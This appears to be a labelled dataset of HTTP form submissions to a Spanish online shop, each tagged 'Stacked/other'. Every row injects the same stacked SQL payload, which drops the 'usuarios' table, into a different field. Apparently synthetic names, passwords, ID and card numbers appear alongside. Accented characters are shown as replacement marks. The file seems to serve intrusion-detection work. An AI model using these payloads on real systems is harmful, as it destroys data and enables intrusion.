source_uid	group	content
10059	Stacked/other	modo=insertar&precio=3650';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=Confirmar
10331	Stacked/other	modo=registro&login=micgael5&password=dogal&nombre=Adelmo&apellidos=Jepus+Novas&email=cagney@hiperespa�a.et';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&dni=99942317A&direccion=Carrer+Sant+Fruitos+1,+&ciudad=Riells+i+Viabrea&cp=29410&provincia=M�laga&ntc=4452881808901719&B1=Registrar
10357	Stacked/other	modo=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&precio=5080&B1=Pasar+por+caja
10363	Stacked/other	modo=registro&login=seagrove&password=pataleo&nombre=Grey&apellidos=Bollit+Ingl�s&email=weigel@lamasguapa.cc&dni=15744863Y&direccion=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&ciudad=Torno,+El&cp=18129&provincia=C�ceres&ntc=2139911097438297&B1=Registrar
10436	Stacked/other	modo=registro&login=youngman&password=a018699t0do&nombre=Ibar&apellidos=Bald�+Almansa&email=damboise@automovilesalhambra.co&dni=44906096E&direccion=Calle+Lima,+50+9-D&ciudad=Catadau&cp=42066&provincia=Madrid&ntc=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=Registrar
10515	Stacked/other	modo=registro&login=horatius&password=323ant5CIdi3&nombre=Herenia&apellidos=Witron+Olivares&email=thrush_orhonsay6@aadsl.no';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&dni=77733072H&direccion=Calle+Reina+Regente+47+&ciudad=Sotillo+del+Rinc�n&cp=09460&provincia=La+Rioja&ntc=7365954967805937&B1=Registrar
10570	Stacked/other	id=1&nombre=Jam�n+Ib�rico&precio=100&cantidad=93&B1=A�adir+al+carrito';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
10586	Stacked/other	modo=entrar&login=schlacht&pwd=43s8a&remember=off&B1=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
10619	Stacked/other	modo=registro&login=swidersk&password=balarrasa&nombre=Yaco&apellidos=Moriana+Romanov&email=sintes@noticiasenvivo.mz&dni=58500108E&direccion=C/+Parque+Iguazu+99,+&ciudad=Ag�imes&cp=48940&provincia=Valencia&ntc=3622353817159390&B1=Registrar';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
10657	Stacked/other	modo=entrar';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&login=chaar&pwd=pe4ibl171o&remember=on&B1=Entrar
